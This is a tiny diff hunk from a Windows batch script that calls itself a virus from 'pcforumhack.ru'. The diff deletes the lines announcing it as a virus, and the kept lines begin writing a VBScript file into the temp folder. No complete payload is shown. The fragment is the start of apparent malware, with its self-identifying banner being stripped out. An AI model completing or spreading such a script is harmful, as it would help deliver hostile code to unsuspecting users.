@@ -1,5 +1,3 @@
-@echo This virus created by LIZA 
-@echo Virus: pcforumhack.ru™ Virus 
 @echo Autor: LIZA 
 @echo off 
 echo Chr(39)>%temp%\temp1.vbs 
